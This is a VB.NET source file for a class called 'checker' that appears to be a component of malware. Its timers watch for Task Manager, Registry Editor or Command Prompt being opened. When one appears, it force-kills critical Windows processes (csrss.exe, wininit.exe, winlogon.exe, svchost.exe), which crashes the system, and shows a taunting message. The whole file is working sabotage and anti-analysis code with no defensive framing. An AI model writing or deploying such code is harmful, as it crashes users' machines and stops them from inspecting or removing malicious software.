Public Class checker
    Private Sub checktaskmgr_Tick(sender As Object, e As EventArgs) Handles checktaskmgr.Tick
        Dim taskmgrName As String = "Taskmgr"
        Dim taskmgrList() As Process
        Try
            taskmgrList = Process.GetProcesses()

            For Each taskmgr As Process In taskmgrList
                If (taskmgrName = taskmgr.ProcessName) Then
                    checktaskmgr.Stop()
                    kill()
                    MsgBox("Fxck.. Too late.. You opened the Task Manager..")
                End If
            Next taskmgr
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub
    Private Sub checkregedit_Tick(sender As Object, e As EventArgs) Handles checkregedit.Tick
        Dim regeditName As String = "regedit"
        Dim regeditList() As Process
        Try
            regeditList = Process.GetProcesses()

            For Each regedit As Process In regeditList
                If (regeditName = regedit.ProcessName) Then
                    checkregedit.Stop()
                    kill()
                    MsgBox("Fxck.. Too late.. You opened the Registery..")
                End If
            Next regedit
        Catch ex As Exception
        Console.WriteLine(ex.Message)
        End Try
    End Sub
    Private Sub checker_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        checktaskmgr.Start()
        checkregedit.Start()
        checkcmd.Start()
    End Sub

    Private Sub checkcmd_Tick(sender As Object, e As EventArgs) Handles checkcmd.Tick
        Dim cmdName As String = "cmd"
        Dim cmdList() As Process
        Try
            cmdList = Process.GetProcesses()

            For Each cmd As Process In cmdList
                If (cmdName = cmd.ProcessName) Then
                    checkcmd.Stop()
                    kill()
                    MsgBox("Fxck.. Too late.. You opened the Command Prompt..")
                End If
            Next cmd
        Catch ex As Exception
            Console.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub kill()
        Shell("taskkill /f /im cmd.exe")
        Shell("taskkill /f /im csrss.exe")
        Shell("taskkill /f /im wininit.exe")
        Shell("taskkill /f /im winlogon.exe")
        Shell("taskkill /f /im svchost.exe")
    End Sub
End Class
